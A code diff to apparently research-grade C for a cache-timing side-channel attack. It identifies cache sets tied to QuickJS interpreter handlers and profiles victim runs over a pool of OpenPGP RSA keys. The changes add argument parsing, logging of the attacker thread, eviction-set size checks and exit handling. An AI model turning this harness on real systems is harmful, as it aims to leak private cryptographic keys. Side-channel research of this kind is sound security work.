@@ -23,11 +23,11 @@
 
 enum { cache_line_count = 2, profile_iterations = 1 << 15 };
 static uint64_t victim_runs = 128;
-static const int key_pool_size = 128;
+static int key_pool_size = 128;
 static const char *test_name = "quickjs_openpgp_rsa_key_pool";
 static const uint64_t max_exec_cycles = (uint64_t)3e9;
 
-static const uint32_t sar_base_freq = 4667, goto8_base_freq = 9333;
+static uint32_t sar_base_freq = 5400, goto8_base_freq = 10800;
 static uint64_t probe_time_arr[cache_line_count][profile_iterations];
 static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
 static uint64_t *sample_tsc[cache_line_count];
@@ -85,6 +85,9 @@ static int identify_quickjs_target_sets(EVSet **evset_goto8,
                                         EVSet **evset_sar) {
 	config_t *cfg = get_config();
 	int found = 0;
+
+	log_info("Attacker (cache-set identification) running on core %d",
+	         get_current_cpu());
 
 	if (cache_env_init(1)) {
 		log_error("Failed to initialize cache env!\n");
@@ -152,6 +155,14 @@ static int identify_quickjs_target_sets(EVSet **evset_goto8,
 
 		evset = get_sf_kth_evset(l3_set);
 		if (evset) {
+			if (evset->size < SF_ASSOC) {
+				log_error("evset for set %d has %u ways, expected >= %d; "
+				          "aborting",
+				          l3_set,
+				          evset->size,
+				          SF_ASSOC);
+				abort();
+			}
 			memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
 			memset(probe_time_arr, 0, sizeof(probe_time_arr));
 
@@ -225,6 +236,13 @@ static int identify_quickjs_target_sets(EVSet **evset_goto8,
 	}
 
 	stop_helper_thread(&hctrl);
+
+	if (!found) {
+		log_info("No target cache sets found.");
+		sync_ctx_set_action(SYNC_CTX_EXIT);
+		pthread_barrier_wait(sync_ctx.barrier);
+	}
+
 	return found;
 }
 
@@ -239,7 +257,7 @@ void openpgp_rsa_key_pool() {
 	}
 
 	for (int key_id = 0; key_id < key_pool_size; ++key_id) {
-		sprintf(test_key_name, "%s_key%05d", test_name, key_id);
+		sprintf(test_key_name, "%s/%s_key%05d", test_name, test_name, key_id);
 		log_info("test key name %s", test_key_name);
 
 		snprintf(
@@ -259,20 +277,66 @@ void openpgp_rsa_key_pool() {
 	}
 
 	pthread_barrier_destroy(&attacker_threads_barrier);
+
+	sync_ctx_set_action(SYNC_CTX_EXIT);
+	pthread_barrier_wait(sync_ctx.barrier);
 }
 
-int main() {
+int main(int argc, char **argv) {
 	quickjs_get_bytecode_handler_cacheline();
 
-	const char *env_victim_runs = getenv("VICTIM_RUNS");
-	if (env_victim_runs != NULL) {
+	if (argc > 1) {
 		char *endptr;
 		errno = 0;
-		uint64_t value = strtoull(env_victim_runs, &endptr, 10);
-		if (errno == 0 && endptr != env_victim_runs && *endptr == '\0') {
-			victim_runs = value;
+		long value = strtol(argv[1], &endptr, 10);
+		if (errno == 0 && endptr != argv[1] && *endptr == '\0' && value > 0) {
+			key_pool_size = (int)value;
+		} else {
+			log_error("Invalid num_keys argument '%s'", argv[1]);
+			return -1;
 		}
 	}
+	if (argc > 2) {
+		char *endptr;
+		errno = 0;
+		uint64_t value = strtoull(argv[2], &endptr, 10);
+		if (errno == 0 && endptr != argv[2] && *endptr == '\0' && value > 0) {
+			victim_runs = value;
+		} else {
+			log_error("Invalid num_runs argument '%s'", argv[2]);
+			return -1;
+		}
+	}
+
+	if (argc > 3) {
+		char *endptr;
+		errno = 0;
+		unsigned long value = strtoul(argv[3], &endptr, 10);
+		if (errno == 0 && endptr != argv[3] && *endptr == '\0' && value > 0) {
+			goto8_base_freq = (uint32_t)value;
+		} else {
+			log_error("Invalid goto8_base_freq argument '%s'", argv[3]);
+			return -1;
+		}
+	}
+	if (argc > 4) {
+		char *endptr;
+		errno = 0;
+		unsigned long value = strtoul(argv[4], &endptr, 10);
+		if (errno == 0 && endptr != argv[4] && *endptr == '\0' && value > 0) {
+			sar_base_freq = (uint32_t)value;
+		} else {
+			log_error("Invalid sar_base_freq argument '%s'", argv[4]);
+			return -1;
+		}
+	}
+
+	log_info("Config: key_pool_size=%d, victim_runs=%lu, goto8_base_freq=%u, "
+	         "sar_base_freq=%u",
+	         key_pool_size,
+	         (unsigned long)victim_runs,
+	         goto8_base_freq,
+	         sar_base_freq);
 
 	for (int i = 0; i < cache_line_count; ++i) {
 		sample_tsc[i] = sample_tsc_arr[i];
